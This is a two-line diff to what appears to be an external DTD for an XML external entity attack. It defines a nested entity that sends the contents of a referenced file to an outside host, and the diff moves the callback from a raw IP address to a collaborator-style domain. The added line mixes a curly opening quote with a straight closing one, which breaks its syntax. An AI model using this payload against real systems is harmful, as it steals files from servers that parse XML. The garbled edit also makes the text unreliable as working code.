@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://149.117.68.97:9000/?collect=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM ‘http://ftcp9qgjc6c0p6mo7x00ittualgc41.cigitalcollaborator.com/?collect=%file;'>">
 %all;
